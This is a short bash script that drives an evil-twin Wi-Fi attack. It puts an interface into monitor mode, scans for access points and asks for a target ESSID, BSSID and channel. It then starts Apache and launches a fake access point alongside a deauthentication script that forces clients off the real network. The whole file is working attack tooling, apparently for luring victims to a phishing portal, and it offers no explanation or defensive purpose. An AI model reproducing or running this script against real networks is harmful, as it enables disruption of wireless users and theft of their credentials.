#!/bin/bash

#color
Cyan='\033[0;36m' # Cyan
NC='\033[0m' # No Color
Red='\033[0;31m' # Red
BIRed='\033[1;91m'        # Red

# Monitor Mode
iwconfig
echo -e "${BIRed}Please write the name of the Interface:${NC}"
read interface

printf "\e${Cyan}\nSet Monitor Mode \n \n"
printf "\e${NC}"
./monitor-mode.sh $interface



# Scan AP
printf "\e${Cyan}\nScan AP \n \n"
echo "Press Control + c to stop the scanning \n \n"
printf "\e${NC}"
python scan-ap.py $interface


echo -e "${BIRed}Please write the name of the ESSID:${NC} "
read essid

echo -e "${BIRed}Please write the name of the BSSID:${NC} "
read bssid

echo -e "${BIRed}Please Enter Channel:${NC} "
read channel


#Create conf file
python configuration.py $interface $essid


#create fake AP
service apache2 start
xterm -e ./fake-ap.sh $interface &
xterm -e ./deauth.sh $bssid $channel $interface &


